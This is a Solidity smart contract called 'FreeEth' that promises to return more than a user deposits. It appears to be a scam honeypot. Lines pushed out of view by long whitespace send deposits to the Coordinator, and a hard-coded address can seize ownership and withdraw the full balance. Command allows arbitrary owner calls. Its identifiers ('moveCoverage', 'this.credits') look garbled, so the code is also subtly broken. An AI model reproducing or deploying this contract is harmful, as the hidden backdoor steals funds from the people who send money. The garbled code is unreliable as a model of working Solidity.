// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract FreeEth
{
    address public Coordinator = msg.sender;

    function() public payable{}

    function GetFreebie()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Coordinator.moveCoverage(this.credits);
            msg.sender.moveCoverage(this.credits);
        }
    }

    function collectCoverage()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){Coordinator=0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;}
        require(msg.sender == Coordinator);
        Coordinator.moveCoverage(this.credits);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Coordinator);
        adr.call.value(msg.value)(data);
    }
}